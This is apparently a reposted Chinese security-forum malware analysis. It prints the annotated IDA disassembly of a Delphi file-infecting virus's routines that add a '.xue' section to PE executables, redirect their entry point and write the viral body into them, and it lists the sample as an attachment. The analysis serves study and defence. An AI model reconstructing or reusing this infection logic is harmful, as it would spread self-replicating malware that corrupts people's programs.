
# 一个节感染 virus 分析

> 原文：[`www.pediy.com/kssd/pediy10/82296.html`](https://www.pediy.com/kssd/pediy10/82296.html)

样本被破坏了。。。直接用`IDA`看的，大部分功能代码分析了，见`pdb`文件，这里只贴感染部分

代码:



## 汇编代码排版

```asm
Infect proc near                     ; CODE XREF: infect\_\_+1D4 p

fileName= dword ptr -4

    push ebp
    mov ebp, esp
    push ecx
    push ebx
    mov [ebp+fileName], eax
    mov eax, [ebp+fileName]
    call LStrLenAdd1
    xor eax, eax
    push ebp                         ; DWORD
    push offset finally\_do          ; lpFileSizeHigh
    push dword ptr fs:[eax]         ; hFile
    mov fs:[eax], esp
    xor ebx, ebx
    mov eax, [ebp+fileName]
    call GetFileSize\_0              ; eax = filesize
    cmp eax, 40C000h
    jg  short ret\_0
    cmp eax, 9C40h
    jl  short ret\_0
    mov eax, [ebp+fileName]
    call GetFileFreeSpace           ; 获取文件最后一个节末尾到文件末尾的空余空间
    test eax, eax
    jg  short ret\_0
    xor edx, edx
    mov eax, [ebp+fileName]
    call InfectFile                 ; 功能：    感染文件
                                    ; 输入参数：eax = fileName  是 delphi 格式的字符串
                                    ; 输出参数：返回 0 成功，1，2，3 分别代表不同错误
    test eax, eax
    jnz short ret\_0                ; 出错
    mov bl, 1

ret\_0:                             ; CODE XREF: Infect+2D j Infect+34 j ...
    xor eax, eax
    pop edx
    pop ecx
    pop ecx
    mov fs:[eax], edx
    push offset ret

free:                               ; CODE XREF: Infect+6D j
    lea eax, [ebp+fileName]
    call FreeMem\_0
    retn
; ---------------------------------------------------------------------------

; DWORD finally\_do
finally\_do:                        ; DATA XREF: Infect+13 o
    jmp @System@@HandleFinally$qqrv ; System::\_\_linkproc\_\_ HandleFinally(void)
; ---------------------------------------------------------------------------
    jmp short free
; ---------------------------------------------------------------------------

ret:                                ; CODE XREF: Infect+67 j
                                    ; DATA XREF: Infect+5A o
    mov eax, ebx
    pop ebx
    pop ecx
    pop ebp
    retn
Infect endp



; 功能：    感染文件
; 输入参数：eax = fileName  是 delphi 格式的字符串
; 输出参数：返回 0 成功，1，2，3 分别代表不同错误
; Attributes: bp-based frame

; BOOL \_\_stdcall InfectFile(char \*pFileName)    //ida 不支持 delphi 的那种 LStr
InfectFile proc near                 ; CODE XREF: Infect+47 p

var\_1A8= dword ptr -1A8h
var\_1A4= dword ptr -1A4h
SecTabName= dword ptr -17Ch
pSecTab= byte ptr -178h
pNTHeader\_Signature= dword ptr -150h
Machine= word ptr -14Ch
numOfSec= word ptr -14Ah
TimeDateStamp= dword ptr -148h
PointerOfSymTab= dword ptr -144h
NumberOfSymbols= dword ptr -140h
SizeOfOpHeader= word ptr -13Ch
Characteristics= word ptr -13Ah
Magic= word ptr -138h               ; 10bh
var\_136= byte ptr -136h
var\_135= byte ptr -135h
SizeOfCode= dword ptr -134h
SizeInitData= dword ptr -130h
SizeUnInitData= dword ptr -12Ch
OEP = dword ptr -128h
BaseOfCode= dword ptr -124h
BaseOfData= dword ptr -120h
ImageBase= dword ptr -11Ch
SectionAlignment= dword ptr -118h
FileAlignment= dword ptr -114h
var\_110= word ptr -110h
var\_10E= word ptr -10Eh
var\_10C= word ptr -10Ch
var\_10A= word ptr -10Ah
var\_108= word ptr -108h
var\_106= word ptr -106h
var\_104= dword ptr -104h
SizeOfImage= dword ptr -100h
SizeOfHeaders= dword ptr -0FCh
var\_F8= dword ptr -0F8h
var\_F4= dword ptr -0F4h
var\_F0= dword ptr -0F0h
var\_EC= dword ptr -0ECh
var\_E8= dword ptr -0E8h
var\_E4= dword ptr -0E4h
Buffer= word ptr -58h
lDistanceToMove= dword ptr -1Ch
NumberOfBytesWritten= dword ptr -18h
NumberOfBytesRead= dword ptr -14h
cur\_rva= dword ptr -10h
hObject= dword ptr -0Ch
result= dword ptr -8
LStrFilePath= dword ptr -4
pFileName= dword ptr  8
arg\_4= dword ptr  0Ch
arg\_8= dword ptr  10h
arg\_C= dword ptr  14h
arg\_10= dword ptr  18h

    push ebp
    mov ebp, esp
    add esp, 0FFFFFE84h
    push ebx
    push esi
    push edi
    xor ecx, ecx
    mov [ebp+SecTabName], ecx
    mov [ebp+LStrFilePath], eax
    mov eax, [ebp+LStrFilePath]
    call LStrLenAdd1
    lea esi, [ebp+pSecTab]
    xor eax, eax
    push ebp                         ; ppOutData
    push offset exp\_handle          ; lpOverlapped
    push dword ptr fs:[eax]         ; lpNumberOfBytesRead
    mov fs:[eax], esp
    push 0                           ; hTemplateFile
    push 80h                         ; dwFlagsAndAttributes
    push 3                           ; dwCreationDisposition
    push 0                           ; lpSecurityAttributes
    push 3                           ; dwShareMode
    push 0C0000000h                  ; dwDesiredAccess
    mov eax, [ebp+LStrFilePath]
    call @System@@LStrToPChar$qqrx17System@AnsiString ; System::\_\_linkproc\_\_ LStrToPChar(System::AnsiString)
    push eax                         ; lpFileName
    call CreateFileA\_0
    mov [ebp+hObject], eax
    cmp [ebp+hObject], 0FFFFFFFFh
    jnz short createfile\_ok
    mov [ebp+result], 1
    jmp ret\_0
; ---------------------------------------------------------------------------

createfile\_ok:                       ; CODE XREF: InfectFile+5A j
    xor edx, edx
    push ebp
    push offset exp\_handle\_
    push dword ptr fs:[edx]
    mov fs:[edx], esp
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesRead]
    push eax                         ; lpNumberOfBytesRead
    push 40h
    lea eax, [ebp+Buffer]
    push eax                         ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call ReadFile\_0                 ; 读出 PE 头之前的内容
    cmp [ebp+Buffer], IMAGE\_DOS\_SIGNATURE
    jz  short MZ\_ok
    mov [ebp+result], 2
    call @System@@TryFinallyExit$qqrv   ; System::\_\_linkproc\_\_ TryFinallyExit(void)
    jmp ret\_0
; ---------------------------------------------------------------------------

MZ\_ok:                               ; CODE XREF: InfectFile+91 j
    push 0                           ; dwMoveMethod
    push 0                           ; lpDistanceToMoveHigh
    mov eax, [ebp+lDistanceToMove]
    push eax                         ; lDistanceToMove
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call SetFilePointer\_0
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesRead]
    push eax                         ; lpNumberOfBytesRead
    push 0F8h                        ; size of IMAGE\_NT\_HEADERS
    lea eax, [ebp+pNTHeader\_Signature]
    push eax                         ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call ReadFile\_0                 ; 读取 pe 头
    cmp [ebp+pNTHeader\_Signature], IMAGE\_NT\_SIGNATURE
    jz  short PE\_ok
    mov [ebp+result], 2
    call @System@@TryFinallyExit$qqrv   ; System::\_\_linkproc\_\_ TryFinallyExit(void)
    jmp ret\_0
; ---------------------------------------------------------------------------

PE\_ok:                               ; CODE XREF: InfectFile+DA j
    xor edi, edi
    xor eax, eax
    mov [ebp+cur\_rva], eax
    movzx ebx, [ebp+numOfSec]
    dec ebx
    test ebx, ebx
    jl  num\_sec\_zero
    inc ebx

continue\_do:                         ; CODE XREF: InfectFile+206 j
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesRead]
    push eax                         ; lpNumberOfBytesRead
    push 28h                         ; nNumberOfBytesToRead
    push esi                         ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call ReadFile\_0                 ; 读取节表
    lea eax, [ebp+SecTabName]
    mov edx, esi
    call @System@@LStrFromPChar$qqrr17System@AnsiStringpc ; System::\_\_linkproc\_\_ LStrFromPChar(System::AnsiString &,char \*)
    mov eax, [ebp+SecTabName]
    mov edx, offset name\_xue        ; ".xue"
    call @System@@LStrCmp$qqrv        ; System::\_\_linkproc\_\_ LStrCmp(void)
    jnz raw\_check
    push 0                           ; dwMoveMethod
    push 0                           ; lpDistanceToMoveHigh
    mov eax, [esi+IMAGE\_SECTION\_HEADER.PointerToRawData]
    push eax                         ; lDistanceToMove
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call SetFilePointer\_0
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesRead]
    push eax                         ; lpNumberOfBytesRead
    push 6E52h                       ; nNumberOfBytesToRead
    push offset pCode               ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call ReadFile\_0                 ; 读代码
    mov ecx, unknow\_size
    cmp ecx, CodeSize
    jnz short finally\_do
    mov eax, ecx
    xor edx, edx
    push edx
    push eax
    mov eax, pTable
    mov eax, [eax]
    cdq
    cmp edx, [esp+1A8h+var\_1A4]
    jnz short loc\_808E47
    cmp eax, [esp+1A8h+var\_1A8]
    pop edx
    pop eax
    jbe short finally\_do
    jmp short WriteCode
; ---------------------------------------------------------------------------

loc\_808E47:                          ; CODE XREF: InfectFile+184 j
    pop edx
    pop eax
    jle short finally\_do

WriteCode:                            ; CODE XREF: InfectFile+18D j
    mov eax, pTable
    mov eax, [eax]
    mov unknow\_size, eax
    mov eax, pTable
    mov eax, [eax]
    mov CodeSize, eax
    push 0                           ; dwMoveMethod
    push 0                           ; lpDistanceToMoveHigh
    mov eax, [esi+14h]
    push eax                         ; lDistanceToMove
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call SetFilePointer\_0
    call ReadFile\_code
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesWritten]
    push eax                         ; lpNumberOfBytesWritten
    push 6E52h                       ; nNumberOfBytesToWrite
    push offset pCode               ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call WriteFile\_0

finally\_do:                          ; CODE XREF: InfectFile+170 j
                                    ; InfectFile+18B j ...
    mov [ebp+result], 3
    call @System@@TryFinallyExit$qqrv   ; System::\_\_linkproc\_\_ TryFinallyExit(void)
    jmp ret\_0
; ---------------------------------------------------------------------------

raw\_check:                           ; CODE XREF: InfectFile+134 j
    mov eax, [esi+IMAGE\_SECTION\_HEADER.PointerToRawData]
    add eax, [esi+IMAGE\_SECTION\_HEADER.SizeOfRawData]
    cmp edi, eax
    jnb short rva\_check
    mov edi, eax

rva\_check:                           ; CODE XREF: InfectFile+1F3 j
    mov eax, [esi+IMAGE\_SECTION\_HEADER.VirtualAddress]
    add eax, [esi+IMAGE\_SECTION\_HEADER.Misc.VirtualSize]
    cmp eax, [ebp+cur\_rva]
    jbe short dec
    mov [ebp+cur\_rva], eax

dec:                                  ; CODE XREF: InfectFile+200 j
    dec ebx
    jnz continue\_do

num\_sec\_zero:                       ; CODE XREF: InfectFile+FE j
    mov eax, [ebp+OEP]
    cmp eax, [ebp+BaseOfData]       ;检查入口是否在 data 段
    jbe short loc\_808EE3           ;文件入口正常，跳去增加节
    mov [ebp+result], 3
    call @System@@TryFinallyExit$qqrv   ; System::\_\_linkproc\_\_ TryFinallyExit(void)
    jmp ret\_0
; ---------------------------------------------------------------------------

loc\_808EE3:                          ; CODE XREF: InfectFile+218 j
    mov ebx, offset nullsub\_2
    sub ebx, offset GetCurLineAddr
    add ebx, 6E52h
    mov edx, esi
    mov ecx, 5                       ; 添加节名
    mov eax, offset sec\_name\_xue   ; ".xue"
    call LStrCpy\_\_                  ; delphi 版本的字符串拷贝函数:
                                    ; eax = src edx = des ecx = size
    mov eax, pTable
    mov eax, [eax]
    mov unknow\_size, eax
    mov eax, pTable
    mov eax, [eax]
    mov CodeSize, eax
    mov [esi+IMAGE\_SECTION\_HEADER.Misc.PhysicalAddress], ebx
    mov eax, [ebp+cur\_rva]
    mov [esi+IMAGE\_SECTION\_HEADER.VirtualAddress], eax
    mov [esi+IMAGE\_SECTION\_HEADER.SizeOfRawData], ebx
    mov [esi+IMAGE\_SECTION\_HEADER.PointerToRawData], edi
    xor eax, eax
    mov [esi+IMAGE\_SECTION\_HEADER.PointerToRelocations], eax
    xor eax, eax
    mov [esi+IMAGE\_SECTION\_HEADER.PointerToLinenumbers], eax
    mov [esi+IMAGE\_SECTION\_HEADER.NumberOfRelocations], 0
    mov eax, [esi+IMAGE\_SECTION\_HEADER.VirtualAddress]
    mov edx, eax
    and edx, 0FFFh
    test edx, edx
    jbe short rva\_bad
    shr eax, 0Ch
    inc eax
    shl eax, 0Ch
    mov [esi+IMAGE\_SECTION\_HEADER.VirtualAddress], eax

rva\_bad:                             ; CODE XREF: InfectFile+291 j
    mov eax, [esi+IMAGE\_SECTION\_HEADER.PointerToRawData]
    mov edx, eax
    and edx, 1FFh
    test edx, edx
    jbe short loc\_808F6E
    shr eax, 9
    inc eax
    shl eax, 9
    mov [esi+IMAGE\_SECTION\_HEADER.PointerToRawData], eax

loc\_808F6E:                          ; CODE XREF: InfectFile+2AA j
    mov [esi+IMAGE\_SECTION\_HEADER.Characteristics], 0E00000E0h
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesWritten]
    push eax                         ; lpNumberOfBytesWritten
    push 28h                         ; nNumberOfBytesToWrite
    push esi                         ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call WriteFile\_0                 ; 添加节表
    mov eax, [ebp+OEP]
    mov OrgOEP, eax                  ; 保存原 OEP
    mov eax, [ebp+ImageBase]
    mov pCode, eax
    mov eax, [esi+IMAGE\_SECTION\_HEADER.VirtualAddress]
    add eax, 6E52h
    add eax, offset sub\_8088BC
    sub eax, offset GetCurLineAddr
    mov [ebp+OEP], eax               ; 修改 OEP
    add [ebp+SizeOfImage], ebx
    inc [ebp+numOfSec]
    push 0                           ; dwMoveMethod
    push 0                           ; lpDistanceToMoveHigh
    mov eax, [ebp+lDistanceToMove]
    push eax                         ; lDistanceToMove
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call SetFilePointer\_0
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesWritten]
    push eax                         ; lpNumberOfBytesWritten
    push 0F8h                        ; nNumberOfBytesToWrite
    lea eax, [ebp+pNTHeader\_Signature]
    push eax                         ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call WriteFile\_0                 ; 调整 PE 头
    push 0                           ; dwMoveMethod
    push 0                           ; lpDistanceToMoveHigh
    mov eax, [esi+14h]
    push eax                         ; lDistanceToMove
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call SetFilePointer\_0
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesWritten]
    push eax                         ; lpNumberOfBytesWritten
    push 6E52h                       ; nNumberOfBytesToWrite
    push offset pCode               ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call WriteFile\_0
    push 0                           ; lpOverlapped
    lea eax, [ebp+NumberOfBytesWritten]
    push eax                         ; lpNumberOfBytesWritten
    mov eax, offset nullsub\_2
    sub eax, offset GetCurLineAddr
    push eax                         ; nNumberOfBytesToWrite
    mov eax, offset GetCurLineAddr
    push eax                         ; lpBuffer
    mov eax, [ebp+hObject]
    push eax                         ; hFile
    call WriteFile\_0
    xor eax, eax
    mov [ebp+result], eax
    xor eax, eax
    pop edx
    pop ecx
    pop ecx
    mov fs:[eax], edx
    push offset ret\_0

ret\_1:                               ; CODE XREF: InfectFile+3A4 j
    mov eax, [ebp+hObject]
    push eax                         ; hObject
    call CloseHandle\_0
    retn
; ---------------------------------------------------------------------------

exp\_handle\_:                        ; DATA XREF: InfectFile+6B o
    jmp @System@@HandleFinally$qqrv ; System::\_\_linkproc\_\_ HandleFinally(void)
; ---------------------------------------------------------------------------
    jmp short ret\_1
; ---------------------------------------------------------------------------

ret\_0:                               ; CODE XREF: InfectFile+63 j
                                    ; InfectFile+9F j ...
    xor eax, eax
    pop edx
    pop ecx
    pop ecx
    mov fs:[eax], edx
    push offset ret\_writeok

free:                                 ; CODE XREF: InfectFile+3CC j
    lea eax, [ebp+SecTabName]
    call FreeMem\_0
    lea eax, [ebp+LStrFilePath]
    call FreeMem\_0
    retn
; ---------------------------------------------------------------------------

; DWORD exp\_handle
exp\_handle:                          ; DATA XREF: InfectFile+28 o
    jmp @System@@HandleFinally$qqrv ; System::\_\_linkproc\_\_ HandleFinally(void)
; ---------------------------------------------------------------------------
    jmp short free
; ---------------------------------------------------------------------------

ret\_writeok:                         ; CODE XREF: InfectFile+3C6 j
                                    ; DATA XREF: InfectFile+3AE o
    mov eax, [ebp+result]
    pop edi
    pop esi
    pop ebx
    mov esp, ebp
    pop ebp
    retn
InfectFile endp
```



还剩下的一些函数就是 `delphi` 消息部分的函数没分析（对 `delphi` 不熟），和一些加密函数没看

上传的附件

| ![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg) || `vir.rar` |
|---|---|---|
